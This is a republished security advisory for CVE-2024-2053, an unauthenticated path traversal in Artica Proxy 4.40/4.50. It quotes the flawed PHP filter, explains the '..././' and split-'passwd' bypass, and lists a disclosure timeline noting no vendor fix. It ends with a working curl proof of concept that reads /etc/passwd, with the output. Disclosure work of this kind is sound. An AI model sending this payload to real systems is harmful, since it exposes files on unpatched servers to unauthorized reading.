---
title: Artica Proxy 4.40 / 4.50 Local File Inclusion / Traversal
url: https://cxsecurity.com/issue/WLB-2024030010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-03-07
fetch_date: 2025-10-06T17:08:07.353842
---

# Artica Proxy 4.40 / 4.50 Local File Inclusion / Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Artica Proxy 4.40 / 4.50 Local File Inclusion / Traversal** **2024.03.06**  Credit:  **[Jaggar Henry](https://cxsecurity.com/author/Jaggar%2BHenry/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-2053](https://cxsecurity.com/cveshow/CVE-2024-2053/ "Click to see CVE-2024-2053")**  CWE: **[CWE-23](https://cxsecurity.com/cwe/CWE-23 "Click to see CWE-23")  [CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")  [CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

KL-001-2024-001: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability
Title: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability
Advisory ID: KL-001-2024-001
Publication Date: 2024.03.05
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt
1. Vulnerability Details
Affected Vendor: Artica
Affected Product: Artica Proxy
Affected Version: 4.40 and 4.50
Platform: Debian 10 LTS
CWE Classification: CWE-23: Relative Path Traversal
CVE ID: CVE-2024-2053
2. Vulnerability Description
The Artica Proxy administrative web application attempts to
prevent local file inclusion. These protections can be bypassed
and arbitrary file requests supplied by unauthenticated
users will be returned according to the privileges of the
"www-data" user.
3. Technical Description
Prior to authentication, a user can send an HTTP request to
the "images.listener.php" endpoint. This endpoint processes
the "mailattach" query parameter and concatonates the user
supplied value to the "/opt/artica/share/www/attachments/"
file path. The contents of the file located at the newly
created path is returned in the HTTP response body.
The "images.listener.php" endpoint attempts to prevent
a local file inclusion vulnerability by stripping strings
that attempt to traverse into the parent directory from
the user supplied "mailattach" value:
$\_GET["mailattach"]=str\_replace("////","/",$\_GET["mailattach"]);
$\_GET["mailattach"]=str\_replace("///","/",$\_GET["mailattach"]);
$\_GET["mailattach"]=str\_replace("//","/",$\_GET["mailattach"]);
$\_GET["mailattach"]=str\_replace("../","",$\_GET["mailattach"]);
$\_GET["mailattach"]=str\_replace("/etc/","",$\_GET["mailattach"]);
$\_GET["mailattach"]=str\_replace("passwd","",$\_GET["mailattach"]);
$file="/opt/artica/share/www/attachments/{$\_GET["mailattach"]}";
header("Content-type: application/force-download" );
header("Content-Disposition: attachment; \
filename=\"{$\_GET["mailattach"]}\"");
header("Content-Length: ".filesize($file)."" );
header("Expires: 0" );
readfile($file);
If effective, this approach would limit files
accessible by this endpoint to those within the
"/opt/artica/share/www/attachments/" directory. Unfortunately,
the removal of the "../" string is only performed once, so
the resulting file path is not checked. By using the path
"..././foo.txt", the "images.listener.php" endpoint removes the
"../" string resulting in "../foo.txt" - a relative file path
to traverse to the parent directory.
The strings "/etc/" and "passwd" are also stripped from the file
path as many methods of detecting a path traversal vulnerability
rely on fetching the "/etc/passwd" file. By inserting these
strings into specific locations, a user suppplied "mailattach"
value such as "/epasswdtc/ppasswdasswd" is transformed into
"/etc/passwd", bypassing the protection entirely.
An unauthenticated user can leverage this endpoint to read
files on the system, according to the privileges of the
"www-data" user.
4. Mitigation and Remediation Recommendation
No response from vendor; no remediation available.
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic,
Inc.
6. Disclosure Timeline
2023.12.18 - KoreLogic requests vulnerability contact and
secure communication method from Artica.
2023.12.18 - Artica Support issues automated ticket #1703011342
promising follow-up from a human.
2024.01.10 - KoreLogic again requests vulnerability contact and
secure communication method from Artica.
2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
mail.articatech.com with response
"Client host rejected: Go Away!"
2024.01.11 - KoreLogic requests vulnerability contact and
secure communication method via
https://www.articatech.com/ 'Contact Us' web form.
2024.01.23 - KoreLogic requests CVE from MITRE.
2024.01.23 - MITRE issues automated ticket #1591692 promising
follow-up from a human.
2024.02.01 - 30 business days have elapsed since KoreLogic
attempted to contact the vendor.
2024.02.06 - KoreLogic requests update on CVE from MITRE.
2024.02.15 - KoreLogic requests update on CVE from MITRE.
2024.02.22 - KoreLogic reaches out to alternate CNA for
CVE identifiers.
2024.02.26 - 45 business days have elapsed since KoreLogic
attempted to contact the vendor.
2024.02.29 - Vulnerability details presented to AHA!
(takeonme.org) by proxy.
2024.03.01 - AHA! issues CVE-2024-2053 to track this
vulnerability.
2024.03.05 - KoreLogic public disclosure.
7. Proof of Concept
$ curl -k
'https://192.168.2.129:9000/images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Tim...